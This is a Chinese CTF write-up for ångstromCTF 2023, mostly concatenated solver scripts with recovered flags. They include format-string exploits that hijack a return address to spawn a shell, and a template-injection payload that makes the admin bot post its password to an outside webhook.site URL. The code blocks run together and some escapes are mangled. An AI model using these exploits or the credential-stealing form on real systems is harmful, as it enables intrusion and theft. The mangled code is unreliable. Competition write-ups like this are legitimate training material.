# ångstromCTF Writeup by VP-Union

> 原文: https://www.ctfiot.com/122441.html
> ID: 122441

在本次2023年的ångstromCTF国际赛上，星盟安全团队的Polaris战队和Chamd5的Vemon战队联合参赛，合力组成VP-Union联合战队，勇夺第56名的成绩。

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
from struct import pack
from ctypes import *
    #from LibcSearcher import *
from hashlib import sha256
import sys
from pwnlib.util.iters import mbruteforce
import string

def s(a) : p.send(a)
def sa(a, b) : p.sendafter(a, b)
def sl(a) : p.sendline(a)
def sla(a, b) : p.sendlineafter(a, b)
def r() : return p.recv()
def pr() : print(p.recv())
def rl(a) : return p.recvuntil(a)
def inter() : p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr() : return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)

context(os='linux', arch='amd64', log_level='debug')
    #p = process('./pwn')
p = remote('challs.actf.co', 31402)
elf = ELF('./pwn')
    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(0x100):
    rl(b'Combine the first 3 letters of ')
    a = p.recv(3)
    rl(b'with the last 3 letters of ')
    b = rl(b'n')[:-1][-3:]
    sl(a + b)
    print(' +++++++++++++++ ', i)
    
pr()
from pwn import *
from struct import pack
from ctypes import *
    #from LibcSearcher import *
from hashlib import sha256
import sys
from pwnlib.util.iters import mbruteforce
import string

def s(a) : p.send(a)
def sa(a, b) : p.sendafter(a, b)
def sl(a) : p.sendline(a)
def sla(a, b) : p.sendlineafter(a, b)
def r() : return p.recv()
def pr() : print(p.recv())
def rl(a) : return p.recvuntil(a)
def inter() : p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr() : return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)

context(os='linux', arch='amd64', log_level='debug')
    #p = process('./pwn')
p = remote('challs.actf.co', 31500)
elf = ELF('./pwn')
    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# leak stack
sla(b'Professional): ', b'%25$p')
rl(b'0x')
stack = int(p.recv(12), 16)
i = stack - 0x180
ret = stack - 0x110
rbp = ret - 0x8

# set i -> 0
sa(b'Professional): ', (b'%' + str((i + 3)&0xffff).encode() + b'c%25$hn').ljust(0xd,b'a'))
sla(b'Professional): ', b'%255c%55$hhn')
# leak libc_base and pro_base
sla(b'Professional): ', b'%9$px00')
rl(b'0x')
libc_base = int(p.recv(12), 16) - 0x2206a0

    #gdb.attach(p, 'b *$rebase(0x145b)')

# set rbp -> rbp
sla(b'Professional): ', b'%' + str(rbp&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str(rbp & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((rbp + 1)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((rbp >> 8) & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((rbp + 2)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((rbp >> 16) & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((rbp + 3)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((rbp >> 24) & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((rbp + 4)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((rbp >> 32) & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((rbp + 5)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((rbp >> 40) & 0xff).encode() + b'c%55$hhn')

# set ret -> one_gadget
one_gadget = libc_base + 0xebcf1
sla(b'Professional): ', b'%' + str(ret&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str(one_gadget & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((ret + 1)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((one_gadget >> 8) & 0xff).encode() + b'c%55$hhn')

sla(b'Professional): ', b'%' + str((ret + 2)&0xff).encode() + b'c%25$hhn')
sla(b'Professional): ', b'%' + str((one_gadget >> 16) & 0xff).encode() + b'c%55$hhn')

# set i 
sa(b'Professional): ', (b'%' + str((i + 3)&0xff).encode() + b'c%25$hhn').ljust(0xd,b'a'))
sla(b'Professional): ', b'%55$hhn')

inter()
    #pause()
from pwn import *
from struct import pack
from ctypes import *
    #from LibcSearcher import *
from hashlib import sha256
import sys
from pwnlib.util.iters import mbruteforce
import string

def s(a) : p.send(a)
def sa(a, b) : p.sendafter(a, b)
def sl(a) : p.sendline(a)
def sla(a, b) : p.sendlineafter(a, b)
def r() : return p.recv()
def pr() : print(p.recv())
def rl(a) : return p.recvuntil(a)
def inter() : p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr() : return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
def csu(rdi, rsi, rdx, rip, gadget) : return p64(gadget) + p64(0) + p64(1) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - 0x1a)

context(os='linux', arch='amd64', log_level='debug')
p = process('./pwn')
    #p = remote('challs.actf.co', 31400)
elf = ELF('./pwn')
    #libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    #gdb.attach(p, 'b *$rebase(0x1262)')

sla(b'leek? ', b'%*1$c%56c%13$n')
sla(b'leek? ', b'%*12$c%' + str(0xa5916).encode() + b'c%42$n')

inter()
actf{ive_be3n_checkm4ted_21d1b2cebabf983f}
a = 'anextremelycomplicatedkeythatisdefinitelyuselessss'
b = [0x32, 0x26, 0x20, 0x3D, 0x24, 0x21, 0x2D, 0x28, 0x20, 0x3C, 0x2A, 0x2B, 0x2A, 0x28, 0x20, 0x3F, 0x21, 0x26, 0x24, 0x24, 0x36, 0x2C, 0x2E, 0x20, 0x29, 0x27, 0x20, 0x24, 0x31, 0x39, 0x20, 0x2C, 0x20, 0x23, 0x39, 0x3D, 0x21, 0x31, 0x20, 0x3C, 0x2A, 0x3D, 0x36, 0x20, 0x3C, 0x36, 0x3B, 0x36, 0x36, 0x23, 0x00]

result = ""
for i in range(len(a)):
    result += chr(ord(a[i]) ^b[i])

print(result)
Module: Elixir.Bananas

Attributes: [{vsn, [30426469076575DB017A805FDFD2503F]}]

Compilation Info: [{version, 8.2.3}, {options, [no_spawn_compiler_process, from_core, no_core_prepare, no_auto_import]}, {source, /Users/alexahunleth/experiments/cybersec_challs/bananas/lib/bananas.ex}]

//Function Elixir.Bananas:
__info__/1
label01: func_info Elixir.Bananas __info__ 1
label02: select_val X[0] label09 [attributes, label08, compile, label08, deprecated, label07, exports_md5, label06, functions, label05, macros, label07, md5, label08, module, label04, struct, label03]
label03: move nil X[0]
 return
label04: move Elixir.Bananas X[0]
 return
label05: move [{main, 0}, {main, 1}] X[0]
 return
label06: move T�}��|�6���� X[0]
 return
label07: move nil X[0]
 return
label08: move X[0] X[1]
 move Elixir.Bananas X[0]
 call_ext_only 2 erlang:
get_module_info/2
label09: call_only 1 label30

//Function Elixir.Bananas:
check/1
label10: func_info Elixir.Bananas check 1 //line lib/bananas.ex, 17
label11: is_nonempty_list label12 X[0]
 get_list X[0] X[1] X[0]
 is_eq_exact label12 X[0] [bananas]
 gc_bif2 label00 2 erlang:+/2 X[1] 5 X[0] //line lib/bananas.ex, 18
 gc_bif2 label00 1 erlang:*/2 . X[0] 1
 bs_put_utf8 X[0] label79 X[5]
 move . X[0]
 test_heap 971 X[0]
 return
label12: move false X[0]
 return

//Function Elixir.Bananas:
convert_input/1
label13: func_info Elixir.Bananas convert_input 1 //line lib/bananas.ex, 10
label14: allocate 0 1
 call_ext 1 Elixir.String:
trim/1 //line lib/bananas.ex, 12
 call_ext 1 Elixir.String:
split/1 //line lib/bananas.ex, 13
 call_last 1 label23 0

//Function Elixir.Bananas:
main/0
label15: func_info Elixir.Bananas main 0 //line lib/bananas.ex, 3
label16: move nil X[0]
 call_only 1 label18

//Function Elixir.Bananas:
main/1
label17: func_info Elixir.Bananas main 1 //line lib/bananas.ex, 3
label18: allocate 0 0
 move How many bananas do I have?
 X[0]
 call_ext 1 Elixir.IO:
gets/1 //line lib/bananas.ex, 4
 call 1 label14 //line lib/bananas.ex, 5
 call 1 label11 //line lib/bananas.ex, 6
 call_last 1 label20 0

//Function Elixir.Bananas:
print_flag/1
label19: func_info Elixir.Bananas print_flag 1 //line lib/bananas.ex, 25
label20: is_eq_exact label21 X[0] true
 allocate 0 0
 move flag.txt X[0]
 call_ext 1 Elixir.File:
read!/1 //line lib/bananas.ex, 30
 call_ext_last 1 Elixir.IO:
puts/1 0 //line lib/bananas.ex, 31
label21: move Nope X[0]
 call_ext_only 1 Elixir.IO:
puts/1 //line lib/bananas.ex, 26

//Function Elixir.Bananas:
to_integer/1
label22: func_info Elixir.Bananas to_integer 1 //line lib/bananas.ex, 34
label23: is_nonempty_list label24 X[0]
 get_list X[0] X[1] X[2]
 is_nonempty_list label24 X[2]
 get_tl X[2] X[3]
 is_nil label24 X[3]
 allocate 1 3
 move X[2] Y[0]
 move X[1] X[0]
 call_ext 1 erlang:
binary_to_integer/1 //line lib/bananas.ex, 35
 test_heap 2 1
 put_list X[0] Y[0] X[0]
 deallocate 1
 return
label24: return

//Function Elixir.Bananas:
module_info/0
label25: func_info Elixir.Bananas module_info 0
label26: move Elixir.Bananas X[0]
 call_ext_only 1 erlang:
get_module_info/1

//Function Elixir.Bananas:
module_info/1
label27: func_info Elixir.Bananas module_info 1
label28: move X[0] X[1]
 move Elixir.Bananas X[0]
 call_ext_only 2 erlang:
get_module_info/2

//Function Elixir.Bananas:-inlined-__info__/1-/1
label29: func_info Elixir.Bananas -inlined-__info__/1- 1
label30: jump label29
 int_code_end
    #gpt翻译一下，写个爆破脚本就行
# -*- coding:
UTF-8 -*-
from pwn import *
import  time

# 连接远程主机

num=0
# 循环发送输入并接收输出

while True:
    # 接收并打印服务器发送的输入提示信息
    r = remote('challs.actf.co', 31403)
   
   
    # 构造输入
    result0 = r.recvline().decode().strip()
    bananas =  str(num)+" bananas"
    bananas += "n"
   
    # 发送输入
    r.send(bananas.encode())
    time.sleep(2)
    # 接收输出并判断是否为"Nope"
    result = r.recvline().decode().strip()
    print(result)
    print(num)
    if result == "Nope":
        num += 1
    else:
        print(result)
        break
    r.close()
# 关闭连接
cards[id].type = type == "image/svg+xml" ? type : "text/plain";
cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
module.exports = {
    name: "brokenlogin",
    timeout: 7000,
    async execute(browser, url) {
        if (!/^https://brokenlogin.web.actf.co/.*/.test(url)) return;

        const page = await browser.newPage();

        await page.goto(url);
        await page.waitForNetworkIdle({
            timeout: 5000,
        });

        await page.waitForSelector("input[name=username]");

        await page.$eval(
            "input[name=username]",
            (el) => (el.value = "admin")
        );

        await page.waitForSelector("input[name=password]");

        await page.$eval(
            "input[name=password]",
            (el, password) => (el.value = password),
            process.env.CHALL_BROKENLOGIN_FLAG
        );

        await page.click("input[type=submit]");

        await new Promise((r) => setTimeout(r, 1000));

        await page.close();
    },
};
from flask import Flask, make_response, request, escape, render_template_string

app = Flask(__name__)

fails = 0

indexPage = """
<html>
    <head>
        <title>Broken Login</title>
    </head>
    
        %s
        Number of failed logins: {{ fails }}
        <form action="/" method="POST">
            <label for="username">Username: </label>
            



            <label for="password">Password: </label>
            



            
        </form>
    
</html>
"""

@app.get("/")
def index():
    global fails
    custom_message = ""

    if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)
        
        custom_message = escape(request.args["message"])
    
    return render_template_string(indexPage % custom_message, fails=fails)

@app.post("/")
def login():
    global fails
    fails += 1
    return make_response("wrong username or password", 401)

if __name__ == "__main__":
    app.run("0.0.0.0")
?message={{request.args.a}}&a=
https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=<form action="https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836" method="POST">
            <label for="username">Username: </label>
            



            <label for="password">Password: </label>
            



            
        </form>
import string

f = open("flag.txt").read()

encrypted = ""

shift = int(open("secret_shift.txt").read().strip())

for i in f:
    if i in string.ascii_lowercase:
        encrypted += chr(((ord(i) - 97 + shift) % 26)+97)
    else:
        encrypted += i

print(encrypted)
import string
c = "rtkw{cf0bj_czbv_nv'cc_y4mv_kf_kip_re0kyvi_uivjj1ex_5vw89s3r44901831}"

for shift in range(26):
    plain = ''
    for i in c:
        if i in string.ascii_lowercase:
            plain += chr(((ord(i) - 97 - shift) % 26)+97)
        else:
            plain += i
    print(plain)
# actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}
from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))
"""
n = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230158509195522123739130077725744091649212709410268449632822394998403777113982287135909401792915941770405800840172214125677106752311001755849804716850482011237
e = 65537
c = 40544832072726879770661606103417010618988078158535064967318135325645800905492733782556836821807067038917156891878646364780739241157067824416245546374568847937204678288252116089080688173934638564031950544806463980467254757125934359394683198190255474629179266277601987023393543376811412693043039558487983367289
(p-2)*(q-1) = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230125943565148141498300205893475242956903188936949934637477735897301870046234768439825644866543391610507164360506843171701976641285249754264159339017466738250
(p-1)*(q-2) = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230123577760657520479879758538312798938234126141096433998438004751495264208294710150161381066757910797946636886901614307738041629014360829994204066455759806614
"""
import gmpy2
from Crypto.Util.number import *

n = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230158509195522123739130077725744091649212709410268449632822394998403777113982287135909401792915941770405800840172214125677106752311001755849804716850482011237
e = 65537
c = 40544832072726879770661606103417010618988078158535064967318135325645800905492733782556836821807067038917156891878646364780739241157067824416245546374568847937204678288252116089080688173934638564031950544806463980467254757125934359394683198190255474629179266277601987023393543376811412693043039558487983367289
# (p-2)*(q-1)
A = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230125943565148141498300205893475242956903188936949934637477735897301870046234768439825644866543391610507164360506843171701976641285249754264159339017466738250
# (p-1)*(q-2)
B = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230123577760657520479879758538312798938234126141096433998438004751495264208294710150161381066757910797946636886901614307738041629014360829994204066455759806614
# from z3 import *
# S = Solver()
# p = Int('p')
# q = Int('q')
# S.add(p*q==n)
# S.add((p-2)*(q-1)==A)
# if S.check():
#     print(S.model())
q = 10066608627787074136474825702134891213485892488338118768309318431767076602486802139831042195689782446036335353380696670398366251621025771896701757102780451
p = 12432413118408092556922180864578909882548688341838757808040464238372914542545091804094841981170595006563808958609560634333378522509950041851974318809712087
m = pow(c,gmpy2.invert(e, (p-1)*(q-1)), n)
print(long_to_bytes(int(m)))
# actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)

d = pow(e, -1, (p-1)*(q-1))

c = int(input("Text to decrypt: "))

if c == m or b"actf{" in long_to_bytes(pow(c, d, n)):
    print("No flag for you!")
    exit(1)

print("m =", pow(c, d, n))
from pwn import *
from Crypto.Util.number import *
sh = remote('challs.actf.co',32400)
exec(sh.recvline().decode())
exec(sh.recvline().decode())
exec(sh.recvline().decode())
X = getPrime(5)
Y = (c * (X ** e)) % n
sh.sendlineafter(b'Text to decrypt: ', str(Y).encode())
exec(sh.recvline().decode())
Z = m
i = 0
while True:
    M = (n * i + Z) // X
    if b'actf' in long_to_bytes(M):
        print(long_to_bytes(M))  # actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}
        break
#!/usr/local/bin/python

def fake_psi(a, b):
    return [i for i in a if i in b]

def zero_encoding(x, n):
    ret = []

    for i in range(n):
        if (x & 1) == 0:
            ret.append(x | 1)

        x >>= 1

    return ret

def one_encoding(x, n):
    ret = []

    for i in range(n):
        if x & 1:
            ret.append(x)

        x >>= 1

    return ret

print("Supply positive x and y such that x < y and x > y.")
x = int(input("x: "))
y = int(input("y: "))

if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
    print(open("flag.txt").read())
from pwn import *
sh =remote('challs.actf.co', 32200)
sh.sendlineafter(b'x:', str(int('1'*65, 2)).encode())
sh.sendlineafter(b'y:', str(int('1'*64, 2)).encode())
sh.interactive()
# actf{se3ms_pretty_p0ssible_t0_m3_7623fb7e33577b8a}
#!/usr/local/bin/python
import random

with open('flag.txt', 'r') as f:
 FLAG = f.read()

assert all(c.isascii() and c.isprintable() for c in FLAG), 'Malformed flag'
N = len(FLAG)
assert N <= 18, 'I'm too lazy to store a flag that long.'
p = None
a = None
M = (1 << 127) - 1

def query1(s):
 if len(s) > 100:
  return 'I'm too lazy to read a query that long.'
 x = s.split()
 if len(x) > 10:
  return 'I'm too lazy to process that many inputs.'
 if any(not x_i.isdecimal() for x_i in x):
  return 'I'm too lazy to decipher strange inputs.'
 x = (int(x_i) for x_i in x)
 global p, a
 p = random.sample(range(N), k=N)
 a = [ord(FLAG[p[i]]) for i in range(N)]
 res = ''
 for x_i in x:
  res += f'{sum(a[j] * x_i ** j for j in range(N)) % M}n'
 return res

query1('0')

def query2(s):
 if len(s) > 100:
  return 'I'm too lazy to read a query that long.'
 x = s.split()
 if any(not x_i.isdecimal() for x_i in x):
  return 'I'm too lazy to decipher strange inputs.'
 x = [int(x_i) for x_i in x]
 while len(x) < N:
  x.append(0)
 z = 1
 for i in range(N):
  z *= not x[i] - a[i]
 return ' '.join(str(p_i * z) for p_i in p)

while True:
 try:
  choice = int(input(": "))
  assert 1 <= choice <= 2
  match choice:
   case 1:
    print(query1(input("t> ")))
   case 2:
    print(query2(input("t> ")))
 
except Exception as e:
  print("Bad input, exiting", e)
  break
import random
from pwn import *
# context.log_level = 'debug'

sh = remote('challs.actf.co', 32100)
sh.sendlineafter(b':', b'1')
t = 127
sh.sendlineafter(b'>', str(t).encode())
num1 = int(sh.recvline().decode())
print(num1)
for N in range(18, 9, -1):
    a = []
    tmp_num1 = num1
    tmp_N = N
    while tmp_N >= 0 and tmp_num1 > 0:  # 0不能忽略，故为大于等于
        tmp = tmp_num1 // pow(t, tmp_N)
        a.append(tmp)
        tmp_num1 -= tmp * pow(t, tmp_N)
        tmp_N -= 1
    if max(a) > 126:
        continue
    if all(chr(c).isascii() and chr(c).isprintable() for c in a):
        print('N =', N+1)
        a = a[::-1]  # 记得倒序
        print('a =', bytes(a), a, sum(a), len(a), set(a))
        sh.sendlineafter(b':', b'2')
        ans = ' '.join([str(i) for i in a])
        print(ans)
        sh.sendlineafter(b'>', ans.encode())
        Index = sh.recvline().decode().split()
        flag = ''
        print(Index)
        for i in range(N+1):
            flag += chr(a[Index.index(str(i))])
        print(flag)  # actf{f80f6086a77b}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/3-1687914817.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/10-1687914818.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1687914819.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1687914820.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/4-1687914820.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/6-1687914821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1687914821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1687914822.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1687914823.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1687914823.png)